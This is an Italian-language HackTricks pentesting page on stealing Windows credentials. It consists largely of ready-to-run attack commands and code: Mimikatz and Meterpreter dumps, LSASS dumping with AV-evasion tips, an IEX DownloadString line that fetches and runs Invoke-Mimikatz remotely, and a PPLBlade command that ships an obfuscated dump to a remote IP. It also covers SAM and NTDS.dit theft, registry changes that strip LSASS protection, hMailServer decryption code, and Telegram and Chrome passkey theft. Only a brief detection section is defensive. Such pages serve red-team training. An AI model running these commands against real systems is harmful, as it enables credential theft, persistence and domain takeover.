# Rubare le credenziali di Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenziali con Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Scopri cos'altro può fare Mimikatz in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Scopri alcune possibili protezioni delle credenziali qui.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Usa il [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **che** ho creato per **cercare password e hash** all'interno della vittima.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Bypassare l'AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento Microsoft legittimo**, Defender non lo rileva.\
Puoi usare questo strumento per **fare il dump del processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.

Puoi anche usare [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: alcuni **AV** potrebbero **rilevare** come **malevolo** l’uso di **procdump.exe per eseguire il dump di lsass.exe**; questo accade perché **rilevano** le stringhe **"procdump.exe" e "lsass.exe"**. Quindi è più **furtivo** passare a procdump come **argomento** il **PID** di lsass.exe **invece del** **nome lsass.exe**.

### Eseguire il dump di lsass con **comsvcs.dll**

Una DLL chiamata **comsvcs.dll**, che si trova in `C:\Windows\System32`, è responsabile del **dump della memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata usando `rundll32.exe`.\
È irrilevante usare i primi due argomenti, ma il terzo è suddiviso in tre componenti. Il PID del processo di cui eseguire il dump costituisce il primo componente, il percorso del file di dump rappresenta il secondo e il terzo componente deve essere la parola **full**. Non sono disponibili opzioni alternative.\
Dopo aver analizzato questi tre componenti, la DLL crea il file di dump e trasferisce al suo interno la memoria del processo specificato.\
È possibile usare **comsvcs.dll** per eseguire il dump del processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio qui: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Per l’esecuzione viene usato il comando seguente:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping di lsass con Task Manager**

1. Fai clic con il tasto destro sulla barra delle applicazioni e fai clic su Task Manager
2. Fai clic su More details
3. Cerca il processo "Local Security Authority Process" nella scheda Processes
4. Fai clic con il tasto destro sul processo "Local Security Authority Process" e fai clic su "Create dump file".

### Dumping di lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Un dump di arresto anomalo dell'intero sistema già esistente, o una copia compressa in una cartella utente accessibile, potrebbe conservare materiale relativo alle credenziali per l'analisi offline. Nomi di file come `MEMORY.DMP` e `MEMORY.7z` sono solo indizi da verificare: controlla la provenienza e l'accessibilità e non presumere che contengano credenziali utilizzabili o attuali.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Estrazione offline delle credenziali dagli snapshot di VM

Un backup leggibile di una VM può contenere un’**immagine della memoria guest** salvata, anche senza accesso al guest in esecuzione o a LSASS. Per VMware, individua i metadati dello snapshot `.vmsn` e il relativo `.vmem`, se presente; non confondere nessuno dei due con un’immagine del disco `.vmdk`. `VMkatz` analizza snapshot o input di directory VM e può recuperare dalla memoria guest [le credenziali delle sessioni di accesso Windows](credentials-mimikatz.md), come hash e ticket. Può anche esaminare dischi virtuali alla ricerca di materiale SAM/LSA. Il prerequisito è l’accesso ai file di backup, non i diritti di debug sulla VM attiva.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

L'esempio in Checkpoint ha recuperato un hash NT dell'Amministratore **locale** da uno snapshot di una VM standalone. L'hash ha consentito l'autenticazione al dominio solo dopo aver verificato separatamente il riutilizzo della password; un hash locale ottenuto da un backup non è automaticamente una credenziale di dominio. Su un host con memoria limitata, VMkatz può eseguire la scansione e rilasciare le pagine in modo incrementale, ma copiare lo snapshot su un host di analisi più potente può comunque essere preferibile.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumping lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento per il dump dei processi protetti che supporta l'offuscamento dei dump di memoria e il loro trasferimento su workstation remote senza scriverli sul disco.

**Funzionalità principali**:

1. Bypass della protezione PPL
2. Offuscamento dei file di dump della memoria per eludere i meccanismi di rilevamento basati sulle firme di Defender
3. Caricamento dei dump di memoria con i metodi di upload RAW e SMB, senza scriverli sul disco (dump fileless)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – dumping di LSASS basato su SSP senza MiniDumpWriteDump

Ink Dragon distribuisce un dumper in tre fasi chiamato **LalsDumper** che non chiama mai `MiniDumpWriteDump`, quindi gli hook EDR su questa API non si attivano:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – cerca in `fdp.dll` un segnaposto composto da 32 caratteri `d` minuscoli, lo sovrascrive con il percorso assoluto di `rtu.txt`, salva la DLL modificata come `nfdp.dll` e chiama `AddSecurityPackageA("nfdp","fdp")`. In questo modo **LSASS** carica la DLL malevola come nuovo Security Support Provider (SSP).
2. **Stage 2 dentro LSASS** – quando LSASS carica `nfdp.dll`, la DLL legge `rtu.txt`, esegue uno XOR di ogni byte con `0x20` e mappa il blob decodificato in memoria prima di trasferirne l'esecuzione.
3. **Stage 3 dumper** – il payload mappato reimplementa la logica di MiniDump usando **direct syscalls** risolte a partire da nomi API sottoposti a hashing (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicato chiamato `Tom` apre `%TEMP%\<pid>.ddt`, scrive nel file un dump compresso di LSASS e chiude l'handle, così da consentire l'esfiltrazione in un secondo momento.

Note per l'operatore:

* Mantieni `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` nella stessa directory. Stage 1 sostituisce il segnaposto hardcoded con il percorso assoluto di `rtu.txt`, quindi separarli interrompe la catena.
* La registrazione avviene aggiungendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puoi inserire tu stesso questo valore per fare in modo che LSASS ricarichi l'SSP a ogni avvio.
* I file `%TEMP%\*.ddt` sono dump compressi. Decomprimili localmente, quindi passali a Mimikatz/Volatility per estrarre le credenziali.
* Per eseguire `lals.exe` sono necessari i diritti di amministratore/SeTcb, affinché `AddSecurityPackageA` abbia successo; al termine della chiamata, LSASS carica in modo trasparente l'SSP non autorizzato ed esegue Stage 2.
* Rimuovere la DLL dal disco non la scarica da LSASS. Elimina la voce del registro e riavvia LSASS (riavviando il sistema), oppure lasciala per mantenere la persistenza a lungo termine.

## CrackMapExec

### Dump degli hash SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump dei segreti LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump the NTDS.dit dal DC target

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump della cronologia delle password di NTDS.dit dal DC target

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Mostra l'attributo pwdLastSet per ogni account NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Furto di SAM & SYSTEM

Questi file dovrebbero trovarsi in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli nel modo consueto** perché sono protetti.

### Dal registro

Il modo più semplice per ottenere una copia di questi file è recuperarla dal registro:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Scarica** quei file sulla tua macchina Kali ed **estrai gli hash** usando:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Puoi copiare file protetti usando questo servizio. Devi essere Administrator.

Per un flusso di lavoro diverso che utilizza snapshot già esposti su una condivisione di rete leggibile, consulta [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Using vssadmin

Il binario vssadmin è disponibile solo nelle versioni Windows Server

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ma puoi fare la stessa cosa da **Powershell**. Questo è un esempio di **come copiare il file SAM** (il disco rigido utilizzato è "C:" e il file viene salvato in C:\users\Public), ma puoi usare questo metodo per copiare qualsiasi file protetto:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code tratto dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Infine, puoi anche usare lo [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per creare una copia di SAM, SYSTEM e ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è noto come il cuore di **Active Directory** e contiene dati fondamentali sugli oggetti utente, sui gruppi e sulle relative appartenenze. È qui che vengono archiviati gli **hash delle password** degli utenti del dominio. Questo file è un database **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

In questo database sono mantenute tre tabelle principali:

- **Data Table**: questa tabella memorizza i dettagli degli oggetti, come utenti e gruppi.
- **Link Table**: tiene traccia delle relazioni, ad esempio delle appartenenze ai gruppi.
- **SD Table**: qui sono archiviati i **descrittori di sicurezza** di ogni oggetto, per garantire la sicurezza e il controllo degli accessi agli oggetti memorizzati.

La ricerca di Christoffer Andersson sul livello database documenta queste tabelle e il loro comportamento specifico per versione in modo più dettagliato.<sup>[[8]](#references)</sup>

Windows usa _Ntdsa.dll_ per interagire con quel file, che viene utilizzato da _lsass.exe_. Di conseguenza, **parte** del file **NTDS.dit** potrebbe trovarsi **nella memoria di `lsass`** (probabilmente è possibile trovare i dati consultati più di recente grazie al miglioramento delle prestazioni ottenuto tramite una **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash viene crittografato tre volte:

1. Decrittare la Password Encryption Key (**PEK**) usando la **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** usando la **PEK** e **RC4**.
3. Decrittare l'**hash** usando **DES**.

La **PEK** ha lo **stesso valore su ogni controller di dominio**, ma è **crittografata** all'interno di **NTDS.dit** con la **BOOTKEY** specifica del controller di dominio, ottenuta dall'hive **SYSTEM** di quel controller. Pertanto, per estrarre le credenziali servono sia **NTDS.dit** sia **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Una [tecnica di reindirizzamento della tabella degli handle del kernel](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) separata può copiare un oggetto file NTDS già aperto senza VSS, ma richiede una primitiva di lettura/scrittura arbitraria del kernel sul controller di dominio.<sup>[[16]](#references)</sup>

### Copiare NTDS.dit usando Ntdsutil

Disponibile da Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Puoi anche usare la tecnica della [**volume shadow copy**](#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che ti servirà anche una copia del **file SYSTEM** (puoi [**estrarlo dal registro oppure usare la tecnica della volume shadow copy**](#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta **ottenuti** i file **NTDS.dit** e **SYSTEM**, puoi usare strumenti come _secretsdump.py_ per **estrarre gli hash**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Puoi anche **estrarle automaticamente** utilizzando un utente domain admin valido:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Per i **file NTDS.dit di grandi dimensioni**, si consiglia di estrarli usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Infine, puoi anche usare il **modulo metasploit**: _post/windows/gather/credentials/domain_hashdump_ oppure **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Vengono estratti non solo i segreti, ma anche tutti gli oggetti e i relativi attributi, per estrarre ulteriori informazioni quando il file NTDS.dit grezzo è già stato recuperato.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

L'hive `SYSTEM` è opzionale, ma consente la decrittazione dei secrets (hash NT e LM, credenziali supplementari come password in chiaro, chiavi kerberos o di trust, cronologie delle password NT e LM). Insieme ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i relativi hash, flag UAC, timestamp dell'ultimo accesso e della modifica della password, descrizioni degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle organizational unit e appartenenze, domini trusted con tipo, direzione e attributi dei trust...

## Lazagne

Scarica il binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi usare questo binario per estrarre le credenziali da diversi software.

```
lazagne.exe all
```

## Altri strumenti per estrarre credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai le credenziali dal file SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Estrai le credenziali dal file SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Scaricalo da:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ed **eseguilo**: le password verranno estratte.

## Raccolta di sessioni RDP inattive e indebolimento dei controlli di sicurezza

Il RAT FinalDraft di Ink Dragon include un tasker `DumpRDPHistory`, le cui tecniche sono utili a qualsiasi red-teamer:<sup>[[3]](#references)</sup>

### Raccolta di telemetria in stile DumpRDPHistory

* **Destinazioni RDP in uscita** – analizza ogni hive utente in `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Ogni sottochiave memorizza il nome del server, `UsernameHint` e il timestamp dell'ultima scrittura. Puoi replicare la logica di FinalDraft con PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Evidenze RDP in ingresso** – interroga il log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` per gli ID evento **21** (accesso riuscito) e **25** (disconnessione) per identificare chi ha amministrato il sistema:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Una volta individuato l'amministratore di dominio che si connette regolarmente, esegui il dump di LSASS (con LalsDumper/Mimikatz) mentre la sua sessione **disconnessa** è ancora attiva. Il fallback di CredSSP + NTLM lascia il suo verifier e i token in LSASS, che possono quindi essere riutilizzati tramite SMB/WinRM per acquisire `NTDS.dit` o predisporre la persistenza sui controller di dominio.

### Downgrade del registro mirati da FinalDraft

Lo stesso impianto altera anche diverse chiavi del registro per facilitare il furto di credenziali:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` disabilita Restricted Admin per le connessioni RDP in ingresso; non abilita il pass-the-hash tramite tale modalità. Impostare il valore su `0` consente Restricted Admin sul computer di destinazione, ma il client deve richiedere `/RestrictedAdmin` o usare un criterio che imponga Restricted Admin.<sup>[[14]](#references)</sup> Un hash da solo non concede diritti di amministratore remoto; vedi [prerequisiti di autenticazione RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` disabilita il filtro dei token UAC, così gli amministratori locali ottengono token senza restrizioni sulla rete.
* `DSRMAdminLogonBehavior=2` consente all'amministratore DSRM di accedere mentre il DC è online, offrendo agli attaccanti un altro account integrato con privilegi elevati.
* `RunAsPPL=0` rimuove le protezioni LSASS PPL, rendendo banale l'accesso alla memoria per i dumper come LalsDumper.

## Credenziali di configurazione di hMailServer (post-compromissione)

Controlla i file di configurazione esatti `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` e `C:\ProgramData\hMailServer\hMailServer.ini`, in base alla struttura di installazione. Un valore `[Security] AdministratorPassword=` leggibile e non vuoto è un hash della password di amministrazione di hMailServer; non è una prova che si tratti della password di Windows Administrator. Se la credenziale viene recuperata, qualsiasi pivot verso un account Windows richiede la verifica indipendente del riutilizzo della password e dei diritti di accesso.

Per le installazioni che usano un database SQL CE, il valore separato `[Database] Password=` nel file INI protegge il database. Nelle installazioni legacy, questo valore è crittografato con Blowfish usando la chiave statica `THIS_KEY_IS_NOT_SECRET` e scambi di endianness di parole da 4 byte. Usa la stringa esadecimale del file INI con questo snippet Python:<sup>[[2]](#references)</sup>

Per prima cosa, verifica che l'account corrente possa leggere **sia** il file INI **sia** il corrispondente database SQL CE `.sdf`. La password del file INI protegge il database; è distinta dagli hash degli account mailbox archiviati al suo interno. Esamina o aggiorna una **copia** di un database in uso, mai il file live.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Con la password in chiaro, copia il database SQL CE per evitare blocchi dei file, carica il provider a 32 bit e aggiornalo, se necessario, prima di interrogare gli hash:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

La colonna `accountpassword` usa il formato hash di hMailServer (modalità hashcat `1421`). Una password di mailbox crackata diventa un pivot verso un utente Windows solo se quella password è riutilizzata da un account locale/di dominio e tale account dispone dei diritti necessari per l'accesso remoto.

## Intercettazione del callback di accesso LSA (LsaApLogonUserEx2)

Alcuni tool acquisiscono **password di accesso in chiaro** intercettando il callback di accesso LSA `LsaApLogonUserEx2`. L'idea è agganciare o avvolgere il callback del pacchetto di autenticazione per acquisire le credenziali **durante l'accesso** (prima dell'hashing), quindi scriverle su disco o restituirle all'operatore. Di solito, questa tecnica viene implementata con un helper che si inietta in LSA o si registra con LSA, quindi registra ogni evento di accesso interattivo/di rete riuscito, includendo nome utente, dominio e password.<sup>[[1]](#references)</sup>

Note operative:
- Richiede privilegi di amministratore locale/SYSTEM per caricare l'helper nel percorso di autenticazione.
- Le credenziali acquisite sono disponibili solo quando avviene un accesso (interattivo, RDP, di servizio o di rete, a seconda dell'hook).

## Credenziali di connessione salvate di SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) archivia le informazioni di connessione salvate in un file `sqlstudio.bin` specifico per ogni utente. I dumper dedicati possono analizzare il file e recuperare le credenziali SQL salvate. Nelle shell che restituiscono solo l'output dei comandi, spesso il file viene esfiltrato codificandolo in Base64 e stampandolo su stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Sul lato operatore, ricostruisci il file ed esegui il dumper localmente per recuperare le credenziali:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Furto di sessioni del browser e cookie tramite Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Furto della sessione `tdata` di Telegram Desktop

Telegram Desktop conserva i dati di autorizzazione e lo stato dell'account nella directory **`tdata`**. Una sessione copiata può essere caricata con strumenti compatibili per autenticarsi senza la password dell'account, finché l'autorizzazione rimane valida; se la crittografia dei dati locali è abilitata, lo stealer ha bisogno anche del passcode. Una sessione autenticata può quindi esporre dati identificativi, metadati delle chat e delle appartenenze, messaggi e contenuti multimediali scaricabili.<sup>[[10]](#references)</sup>

### Individuazione e acquisizione

Cerca sia le installazioni tradizionali sia quelle portatili; i nomi dei pacchetti Microsoft Store variano, quindi elenca le directory dei pacchetti contenenti `TelegramMessenge` e controlla la relativa sottodirectory `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Se le letture normali non riescono e il token del processo **contiene già e abilita** `SeBackupPrivilege`, l'accesso compatibile con il backup offre un'alternativa; non acquisisce il privilegio né eleva il processo. `CreateFileW` con `FILE_FLAG_BACKUP_SEMANTICS` può richiedere la semantica di backup/ripristino e ignorare i controlli di sicurezza dei file quando sono presenti i privilegi richiesti nel token, ma il solo flag non aggira un lock di condivisione incompatibile.<sup>[[10]](#references)[[11]](#references)</sup>

Per i file attivi bloccati, crea/leggi una **Volume Shadow Copy**; per i file bloccati dalle ACL, `robocopy /B` usa la modalità backup e ignora le ACL dei file e delle directory.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Un implant attento alla larghezza di banda può inviare prima solo l’inventario dei percorsi dei file, ricevere un identificativo dello snapshot insieme ai percorsi già archiviati dal C2 e caricare solo i file mancanti. Pertanto, piccoli trasferimenti incrementali dopo l’enumerazione ricorsiva di `tdata` possono comunque indicare un furto di sessione riuscito.<sup>[[10]](#references)</sup>

### Rilevamento e contenimento

Correlate l’accesso ricorsivo a `tdata` da parte di un processo non Telegram con l’abilitazione di `SeBackupPrivilege`, l’apertura di file con semantica di backup, attività VSS o un processo figlio `robocopy.exe` che utilizza `/B`. Cercate inoltre l’enumerazione rapida sia di `%APPDATA%` sia di `%LOCALAPPDATA%\Packages`, seguita da connessioni in uscita dallo stesso processo. Dopo la compromissione, usate **Settings → Devices** (o **Privacy & Security → Active Sessions**) per terminare le sessioni non riconosciute; abilitare la verifica in due passaggi da solo non revoca un’autorizzazione già sottratta.<sup>[[10]](#references)[[13]](#references)</sup>

## Furto di credenziali passkey / WebAuthn da Chrome su Windows

Se si ottiene l’esecuzione di codice come **utente vittima** su un host Windows che usa **Chrome + passkey sincronizzate con Google Password Manager**, le passkey diventano un interessante obiettivo di post-exploitation anche **senza privilegi admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefatti locali interessanti

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** memorizza record **`WebauthnCredentialSpecifics`** codificati in protobuf. Un processo dello stesso utente può enumerare **RP ID**, **username**, **credential ID** e il materiale della chiave privata crittografato per le passkey sincronizzate.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** memorizza lo stato locale di registrazione del dispositivo, ad esempio **`wrapped_identity_private_key`** e il secret avvolto usato per recuperare le credenziali sincronizzate.<sup>[[4]](#references)</sup>

Triage rapido:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### I blob di chiavi vincolati al TPM possono comunque essere abusati come oracolo di firma locale

Se il browser esporta una chiave di identità basata su TPM come **`NCRYPT_OPAQUE_KEY_BLOB`** e archivia quel blob in uno stato accessibile all'utente, il malware **non** deve estrarre la chiave privata grezza. Può semplicemente reimportare il blob sulla **stessa macchina** e chiedere al TPM locale di firmare dati controllati dall'aggressore:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

